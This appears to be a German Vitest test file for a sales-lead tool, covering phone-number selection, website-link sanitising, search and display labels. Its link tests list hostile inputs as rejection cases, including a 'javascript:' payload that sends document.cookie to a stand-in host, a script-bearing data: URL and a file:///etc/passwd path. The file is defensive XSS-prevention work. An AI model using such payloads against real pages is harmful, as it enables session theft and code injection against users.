import { describe, it, expect } from "vitest";
import {
  nummerFuer, anrufbar, websiteLink, websiteText, suchen, leadZeile, leadUnterzeile,
  type Lead,
} from "./lead-wahl";

const lead = (o: Partial<Lead> = {}): Lead => ({ id: "l1", ...o });

describe("nummerFuer — welche Nummer gewaehlt wird", () => {
  it("🔴 die Durchwahl geht vor der Zentrale", () => {
    // Die Zentrale landet beim Gatekeeper. Wer den Entscheider schon hat,
    // will nicht wieder vorne anfangen.
    const n = nummerFuer(lead({ telefon: "040 89740100", telefon_zentrale: "040 897400" }));
    expect(n.e164).toBe("+494089740100");
    expect(n.herkunft).toBe("durchwahl");
    expect(n.zweite).toEqual({ e164: "+49408974 00".replace(" ", ""), herkunft: "zentrale" });
  });

  it("🔴 unbrauchbare Durchwahl faellt auf die Zentrale zurueck und sagt es", () => {
    // Stillschweigend umschwenken heisst, dass jemand ein Gespraech mit der
    // falschen Erwartung beginnt.
    const n = nummerFuer(lead({ telefon: "k.A.", telefon_zentrale: "040 897400" }));
    expect(n.e164).toBe("+4940897400");
    expect(n.herkunft).toBe("zentrale");
    expect(n.zweite).toBeNull();
  });

  it("nur eine Nummer heisst keine zweite", () => {
    expect(nummerFuer(lead({ telefon: "040 89740100" })).zweite).toBeNull();
  });

  it("🔴 zwei Schreibweisen derselben Nummer sind keine zwei Nummern", () => {
    const n = nummerFuer(lead({ telefon: "+49 40 89740100", telefon_zentrale: "040/89740100" }));
    expect(n.e164).toBe("+494089740100");
    expect(n.zweite).toBeNull();
    // 🔴 Aufgefallen in der Mutationsprobe: die Nummer ist dieselbe, die
    // HERKUNFT aber nicht. Stuende hier "Zentrale", ginge der Vertriebler in
    // das Gespraech mit der Erwartung, erst am Gatekeeper vorbei zu muessen.
    expect(n.herkunft).toBe("durchwahl");
  });

  it("ohne brauchbare Nummer wird nichts behauptet", () => {
    for (const l of [null, lead(), lead({ telefon: "" }), lead({ telefon: "siehe Website" })]) {
      const n = nummerFuer(l);
      expect(n.e164).toBeNull();
      expect(n.herkunft).toBeNull();
      expect(anrufbar(l)).toBe(false);
    }
  });

  it("anrufbar sagt ja, wenn es eine Nummer gibt", () => {
    expect(anrufbar(lead({ telefon_zentrale: "089 123456" }))).toBe(true);
  });
});

describe("websiteLink — 🔴 fremde Daten werden nicht blind verlinkt", () => {
  it("nimmt normale Adressen und ergaenzt das Schema", () => {
    expect(websiteLink("useeasy.ai")).toBe("https://useeasy.ai/");
    expect(websiteLink("https://useeasy.ai/preise")).toBe("https://useeasy.ai/preise");
    expect(websiteLink("http://alt.example.de")).toBe("http://alt.example.de/");
    expect(websiteLink("  www.example.de  ")).toBe("https://www.example.de/");
  });

  it("🔴 javascript: und data: kommen NICHT durch", () => {
    // Die Lead-Daten stammen aus einer hochgeladenen Tabelle, die niemand
    // geprueft hat. Ein Klick auf so eine "Website" fuehrt Code in der
    // angemeldeten Konsole aus.
    for (const boese of [
      "javascript:alert(1)",
      "JavaScript:alert(1)",
      "  javascript:fetch('//x.test?c='+document.cookie)  ",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "file:///etc/passwd",
    ]) {
      expect(websiteLink(boese)).toBeNull();
      expect(websiteText(boese)).toBe("");
    }
  });

  it("🔴 nur http und https — ftp und ws haben einen Hostnamen und kaemen sonst durch", () => {
    // Aufgefallen in der Mutationsprobe: nimmt man die Protokollpruefung
    // heraus, faengt der Hostname-Test zwar javascript: und data: ab (die
    // haben keinen Host), aber ftp://example.com kaeme klaglos durch und
    // stuende als "Website" im Lead. Anklickbar, und fuehrt nirgendwohin.
    expect(websiteLink("ftp://example.com")).toBeNull();
    expect(websiteLink("ws://example.com/socket")).toBeNull();
    expect(websiteLink("chrome-extension://abc.def/x")).toBeNull();
  });

  it("Unfug wird abgelehnt statt zu einer Adresse geraten", () => {
    for (const roh of ["", "   ", "keine", "n/a", "-", null, undefined]) {
      expect(websiteLink(roh)).toBeNull();
    }
  });

  it("🔴 ein Wort ohne Punkt ist kein Hostname", () => {
    // "intern" wuerde sonst zu https://intern/ und fuehrt ins Leere.
    expect(websiteLink("intern")).toBeNull();
    expect(websiteLink("noch offen")).toBeNull();
  });

  it("websiteText zeigt es lesbar, ohne Schema und Schlussstrich", () => {
    expect(websiteText("https://www.example.de/")).toBe("www.example.de");
    expect(websiteText("example.de/preise")).toBe("example.de/preise");
  });
});

describe("suchen", () => {
  const leads = [
    lead({ id: "a", name: "Fay GmbH", stadt: "Hamburg", branche: "Handel", entscheider: "Carl Fay", telefon: "040 1" }),
    lead({ id: "b", name: "Musterbau", stadt: "München", branche: "Bau", notizen: "Rueckruf Dienstag", telefon: "089 2" }),
    lead({ id: "c", name: "Immo Nord", stadt: "Kiel", list_name: "immo leads", website: "immo-nord.de" }),
  ];

  it("leere Suche gibt alles zurueck", () => {
    expect(suchen(leads, "").length).toBe(3);
    expect(suchen(leads, "   ")).toHaveLength(3);
  });

  it("findet ueber Name, Stadt, Branche, Entscheider", () => {
    expect(suchen(leads, "fay").map((l) => l.id)).toEqual(["a"]);
    expect(suchen(leads, "münchen").map((l) => l.id)).toEqual(["b"]);
    expect(suchen(leads, "bau").map((l) => l.id)).toEqual(["b"]); // Musterbau + Branche Bau
    expect(suchen(leads, "carl").map((l) => l.id)).toEqual(["a"]);
  });

  it("🔴 findet auch ueber die Notizen — danach sucht man im Gespraech", () => {
    expect(suchen(leads, "dienstag").map((l) => l.id)).toEqual(["b"]);
  });

  it("findet ueber Liste und Website", () => {
    expect(suchen(leads, "immo leads").map((l) => l.id)).toEqual(["c"]);
    expect(suchen(leads, "immo-nord").map((l) => l.id)).toEqual(["c"]);
  });

  it("Gross- und Kleinschreibung ist egal", () => {
    expect(suchen(leads, "FAY").map((l) => l.id)).toEqual(["a"]);
  });

  it("nichts gefunden ist eine leere Liste, kein Fehler", () => {
    expect(suchen(leads, "gibtesnicht")).toEqual([]);
  });
});

describe("Beschriftung", () => {
  it("Zeile und Unterzeile lassen Leeres weg statt Trenner zu haeufen", () => {
    expect(leadZeile(lead({ name: "Fay GmbH", stadt: "Hamburg" }))).toBe("Fay GmbH · Hamburg");
    expect(leadZeile(lead({ name: "Fay GmbH" }))).toBe("Fay GmbH");
    expect(leadUnterzeile(lead({ entscheider: "Carl Fay", list_name: "Ecom #3" }))).toBe("Carl Fay · Ecom #3");
    expect(leadUnterzeile(lead({}))).toBe("");
  });

  it("🔴 ein Lead ohne Namen verschwindet nicht, er zeigt seine Kennung", () => {
    expect(leadZeile(lead({ id: "abc-123" }))).toBe("abc-123");
  });
});
